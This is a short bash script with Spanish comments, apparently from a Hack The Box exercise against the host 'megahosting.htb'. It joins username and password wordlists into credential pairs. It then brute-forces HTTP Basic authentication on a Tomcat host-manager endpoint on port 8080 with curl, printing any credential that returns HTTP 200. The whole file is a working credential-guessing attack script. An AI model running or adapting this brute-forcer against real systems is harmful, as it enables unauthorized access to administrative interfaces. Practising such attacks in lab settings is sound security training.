#!/bin/bash

# CREAR CREDENCIALES USER:PASSWORD
usernames=$(cat top-usernames-shortlist.txt)
passwords=$(cat 500-worst-passwords.txt)

for u in $usernames; do
        for p in $passwords; do
                echo "$u:$p" >> combined.txt;
        done
done

# SIMPLE FUZZER
b64=$(cat base64creds.txt)

for i in $b64; do
        sc=$(curl -s -I -L -X GET "http://megahosting.htb:8080/host-manager" -H "Authorization: Basic $i" -o /dev/null -w "%{http_code}" | tr -cd '[:digit:]') 
        if [ $sc -eq 200 ]; then
                printf "%-45s%s" "$i" "$sc"
        fi
done